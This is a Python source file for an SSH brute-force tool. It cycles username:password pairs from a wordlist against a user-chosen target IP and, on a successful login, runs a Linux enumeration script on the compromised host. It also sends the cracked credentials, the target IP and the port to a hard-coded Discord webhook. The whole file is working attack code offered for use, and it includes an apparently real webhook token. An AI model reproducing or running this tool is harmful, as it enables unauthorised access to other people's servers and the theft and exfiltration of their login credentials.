# single ip simple ssh brute forcer




from core.prompt import RavePrompt , Colors , Patterns

from core.embed import BurmeseEmbeds

import paramiko , threading , os , socket , time

from requests import post as reqpost

from paramiko import SSHClient , AutoAddPolicy



from core.enum import LinuxEnumertion




WORDLIST_PATH = './data/wordlist.txt'

LOGS_PATH = './out/logs.txt'

if not os.path.isfile(WORDLIST_PATH):

    RavePrompt.print_min(f'Could {Colors.PURPLE}not{Colors.END} Find a Wordlist.')

    exit(0)



MAX_THREADS = 1


LOGIN_PAIRS = [line.replace('\n' , '') for line in open(WORDLIST_PATH).readlines()]



LOGIN_PAIR_COUNT = len(LOGIN_PAIRS)


if LOGIN_PAIR_COUNT <= 0:
    RavePrompt.print_min('Not Enough Login Pairs.')
    exit(0)


NOTIF_WEBHOOK = 'https://discord.com/api/webhooks/1182143778597908490/627OBpupf8gY1njj_rSUxcIOPauA5mNy_usN75Vhc5zmch3ovIxgCidluqqhulu7Qci1'



class BurmeseData:

    TARGET_IP = 'N/A'

    TARGET_PORT = 22

    BRUTE_ATTEMPT_COUNT = 0

    BURMESE_JOBS = [ ]

    STARTED_AT = 0









AAD = AutoAddPolicy()

def ask_for_ip():

    IP = RavePrompt.ask('IP Address Of Target')


    if not RavePrompt.is_valid_ip(IP):

        RavePrompt.print_min(f'IP Does {Colors.PURPLE}NOT{Colors.END} Appear To Be IPv4.')

        return ask_for_ip()

    else:

        return IP


def ask_for_port():

    PORT = RavePrompt.ask_advanced('Port' , Patterns.PORT)

    return PORT



def init_prompt():

    RavePrompt.clear()

    RavePrompt.sexy_logo()

    RavePrompt.print_seperator()

    RavePrompt.vert('Burmese Settings' , Wordlist=WORDLIST_PATH , Logins=f'{LOGIN_PAIR_COUNT} Logins' , MaxThreads=f'{MAX_THREADS} Threads')

    RavePrompt.print_seperator()

    IP = ask_for_ip()

    PORT = ask_for_port() or 22

    BurmeseData.TARGET_IP = IP

    BurmeseData.TARGET_PORT = PORT





def run_post_ssh_commands(client : SSHClient):

    # change it as you like #

    Linenum = LinuxEnumertion.Scripts.Linenum

    cmd_name = Linenum.data.get('name')

    START = time.time()

    _ , out , _ = client.exec_command(Linenum.command)


    output = RavePrompt.combine_lines_clean(out.readlines())


    output_len = len(output)



    END = time.time()


    if output and output_len:

        PATH = './out/logs.txt'

        file = open(PATH , 'a+')

        file.write(f'{output}\n=============================================================================================\n')

        file.close()

        RavePrompt.vert(f'Ran \'{cmd_name}\' On Target' , Output=f'{output_len} Characters' , Elapsed=RavePrompt.elapsed_detailed(START , END) , Saved=PATH)

        RavePrompt.print_seperator()


def try_connect(name : str , password : str):



    beauty_pair = f'{Colors.PURPLE}{name}{Colors.END}{Colors.GRAY}:{Colors.END}{Colors.PURPLE}{password}{Colors.END}'

    RavePrompt.print_mult(f'Trying Login Pair {beauty_pair} On {Colors.PURPLE}{BurmeseData.TARGET_IP}{Colors.END} ...')


    try:
        CLIENT = SSHClient()

        CLIENT.set_missing_host_key_policy(AAD)

        BurmeseData.BRUTE_ATTEMPT_COUNT += 1

        CLIENT.connect(hostname = BurmeseData.TARGET_IP , username = name , password = password , port= int(BurmeseData.TARGET_PORT))

        RavePrompt.print_imp(f'Successful Authentication With Pair {beauty_pair} ...')


        check_status(name , password)



        RavePrompt.print_imp('Running Post SSH Commands ..')


        run_post_ssh_commands(CLIENT)

        CLIENT.close()



        return 1


        

    except (paramiko.AuthenticationException):

        RavePrompt.print_mult(f'Could not Authenticate With {beauty_pair} ...')
    
    except (paramiko.SSHException , socket.timeout):

        RavePrompt.print_mult(f'SSH Connection {Colors.PURPLE}Failed{Colors.END} , Target Might Be Down ...')
        
        CLIENT.close()

        return 1


def bruteforce_target(index):


    for pair in LOGIN_PAIRS:

        
        spl = pair.split(':')
        name = spl[0]
        password = spl[1]


        # exit code 1 indicates ending of job

        if try_connect(name , password) == 1:

            RavePrompt.print_imp(f'Job #{index} Has Finished Running ...')

            del BurmeseData.BURMESE_JOBS [index]

            break



def init_burmese():


    for INDEX in range(MAX_THREADS):

        JOB = threading.Thread(target = bruteforce_target , args=(INDEX,) , daemon = True)

        JOB.name = f'SSH Bruter Thread # {INDEX}'


        BurmeseData.BURMESE_JOBS.append(JOB)


        RavePrompt.print_mult(f'Created SSH Brute Job {Colors.PURPLE}#{INDEX}{Colors.END}.')




    RavePrompt.print_mult(f'Starting {Colors.PURPLE}{MAX_THREADS}{Colors.END} Jobs.')

    RavePrompt.print_seperator()



    BurmeseData.STARTED_AT = time.time()

    for BURMESE_JOB in BurmeseData.BURMESE_JOBS:

        BURMESE_JOB.start()

    

        


def check_status(username , password):

    TARGET_IP = BurmeseData.TARGET_IP

    TARGET_PORT = BurmeseData.TARGET_PORT

    ATTEMPTS = BurmeseData.BRUTE_ATTEMPT_COUNT

    ELAPSED_TIME = RavePrompt.elapsed_detailed(BurmeseData.STARTED_AT , time.time())


    RavePrompt.print_seperator()


    RavePrompt.vert('Burmese SSH Brute Status' , Target=TARGET_IP , Port=TARGET_PORT , Attempts = ATTEMPTS , Elapsed=ELAPSED_TIME , Username=username , Password=password)


    emb = BurmeseEmbeds.get_embed(TARGET_IP , TARGET_PORT , username , password , ATTEMPTS , ELAPSED_TIME)

    
    reqpost(

        NOTIF_WEBHOOK,


        json = emb
    )




init_prompt()


init_burmese()



while True:

    try:


        if len(BurmeseData.BURMESE_JOBS) <= 0:
            
            RavePrompt.print_mult('Burmese Has Finished All It\'s Jobs , Exiting ...')


            exit(0)
        
    except (KeyboardInterrupt):

        RavePrompt.print_prefix('EXIT' , 'Goodbye.')


        exit(0)
    

